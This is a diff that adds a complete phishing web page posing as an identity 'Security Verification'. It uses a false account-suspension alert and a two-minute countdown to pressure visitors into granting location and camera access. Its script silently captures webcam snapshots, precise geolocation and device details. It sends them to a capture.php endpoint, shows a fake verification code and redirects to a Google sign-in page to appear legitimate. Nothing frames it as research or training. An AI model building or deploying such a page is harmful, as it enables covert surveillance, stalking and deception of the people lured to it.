@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access Required - Security Check</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .header {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: white;
+            border-radius: 2px;
+        }
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            color: #856404;
+        }
+        .alert strong {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 5px;
+        }
+        .permission-list {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        .permission-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .permission-item:last-child {
+            margin-bottom: 0;
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+        .permission-icon {
+            width: 40px;
+            height: 40px;
+            background: #e9ecef;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 18px;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .hidden {
+            display: none !important;
+        }
+        .processing {
+            text-align: center;
+            padding: 30px;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        .step {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 28px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .video-preview {
+            width: 100%;
+            max-width: 320px;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px auto;
+            border: 3px solid #667eea;
+            display: none;
+        }
+        .success {
+            text-align: center;
+            padding: 30px;
+            color: #28a745;
+        }
+        .success-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #6c757d;
+            font-size: 12px;
+            border-top: 1px solid #dee2e6;
+            background: #f8f9fa;
+            border-radius: 0 0 20px 20px;
+        }
+        .countdown {
+            font-size: 14px;
+            color: #dc3545;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Security Verification</h1>
+            <p>Identity confirmation required</p>
+        </div>
+        
+        <div class="content">
+            <div class="alert">
+                <strong>⚠️ Security Alert</strong>
+                Unusual login activity detected. You must complete identity verification within 2 minutes to prevent account suspension.
+                <div class="countdown" id="countdown">02:00</div>
+            </div>
+            
+            <div id="step1">
+                <div class="permission-list">
+                    <div class="permission-item">
+                        <div class="permission-icon">📍</div>
+                        <div>
+                            <strong>Location Access</strong>
+                            <p>Verify your current location matches account records</p>
+                        </div>
+                    </div>
+                    <div class="permission-item">
+                        <div class="permission-icon">📷</div>
+                        <div>
+                            <strong>Camera Access</strong>
+                            <p>Facial recognition verification (3 seconds only)</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="startVerification()">
+                    <span class="step">1</span> Start Secure Verification
+                </button>
+                
+                <div class="footer">
+                    🔐 Powered by Secure Identity Verification System v2.1
+                </div>
+            </div>
+            
+            <div id="step2" class="hidden">
+                <div class="processing">
+                    <div class="spinner"></div>
+                    <h3>Verifying Your Identity</h3>
+                    <p id="status">Initializing security protocols...</p>
+                    <video id="videoPreview" class="video-preview" autoplay playsinline></video>
+                    <div class="permission-list" style="margin-top: 20px;">
+                        <div class="permission-item">
+                            <div class="permission-icon">🔍</div>
+                            <div>
+                                <strong>Live Analysis</strong>
+                                <p>Comparing facial features with database records...</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="step3" class="hidden">
+                <div class="success">
+                    <div class="success-icon">✅</div>
+                    <h3>Verification Complete!</h3>
+                    <p>Your identity has been successfully verified.</p>
+                    <p style="color: #6c757d; font-size: 14px; margin-top: 20px;">
+                        <strong>Verification Code:</strong> SIV-<?php echo rand(100000, 999999); ?>
+                    </p>
+                    <button class="btn" onclick="redirectToLogin()" style="margin-top: 20px;">
+                        Continue to Account
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let videoStream = null;
+        let locationData = null;
+        let countdown = 120; // 2 minutes
+        
+        // Countdown timer
+        function updateCountdown() {
+            const minutes = Math.floor(countdown / 60);
+            const seconds = countdown % 60;
+            document.getElementById('countdown').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (countdown > 0) {
+                countdown--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        
+        updateCountdown();
+        
+        function startVerification() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            
+            // Step 1: Get location
+            getLocation();
+        }
+        
+        function getLocation() {
+            updateStatus("Accessing location services...");
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        locationData = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        updateStatus("Location verified. Accessing camera...");
+                        startCamera();
+                    },
+                    function(error) {
+                        locationData = { 
+                            error: error.message,
+                            timestamp: new Date().toISOString()
+                        };
+                        updateStatus("Location access denied. Accessing camera...");
+                        startCamera();
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                locationData = { 
+                    error: "Geolocation not supported",
+                    timestamp: new Date().toISOString()
+                };
+                updateStatus("Starting camera verification...");
+                startCamera();
+            }
+        }
+        
+        function startCamera() {
+            const video = document.getElementById('videoPreview');
+            
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: 'user'
+                },
+                audio: false 
+            })
+            .then(function(stream) {
+                videoStream = stream;
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                updateStatus("Camera active. Analyzing facial features...");
+                
+                // Capture multiple screenshots over 3 seconds
+                setTimeout(() => captureScreenshot(), 1000);
+                setTimeout(() => captureScreenshot(), 2000);
+                setTimeout(() => {
+                    captureScreenshot();
+                    stopCamera();
+                    updateStatus("Verification complete. Submitting data...");
+                    submitData();
+                }, 3000);
+            })
+            .catch(function(err) {
+                updateStatus("Camera access denied. Submitting available data...");
+                submitData();
+            });
+        }
+        
+        function captureScreenshot() {
+            const video = document.getElementById('videoPreview');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Draw video frame
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Add timestamp overlay
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            ctx.fillRect(10, canvas.height - 40, 200, 30);
+            ctx.fillStyle = 'white';
+            ctx.font = '14px Arial';
+            ctx.fillText(new Date().toLocaleString(), 20, canvas.height - 20);
+            
+            // Convert to base64
+            const screenshot = canvas.toDataURL('image/jpeg', 0.85);
+            
+            // Store temporarily
+            if (!window.screenshots) window.screenshots = [];
+            window.screenshots.push(screenshot);
+            
+            return screenshot;
+        }
+        
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                document.getElementById('videoPreview').style.display = 'none';
+            }
+        }
+        
+        function submitData() {
+            const data = {
+                ip: '', // Will be captured by PHP
+                user_agent: navigator.userAgent,
+                location: locationData,
+                screenshots: window.screenshots || [],
+                device_info: {
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookies_enabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    touch_support: 'ontouchstart' in window
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send to server
+            fetch('capture.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    document.getElementById('step2').classList.add('hidden');
+                    document.getElementById('step3').classList.remove('hidden');
+                    console.log('Verification data submitted successfully');
+                } else {
+                    alert('Verification failed. Please try again.');
+                    location.reload();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            });
+        }
+        
+        function updateStatus(message) {
+            document.getElementById('status').textContent = message;
+        }
+        
+        function redirectToLogin() {
+            window.location.href = 'https://accounts.google.com';
+        }
+        
+        // Auto-start verification if page loaded with parameter
+        if (window.location.search.includes('auto=1')) {
+            startVerification();
+        }
+    </script>
+</body>
+</html>
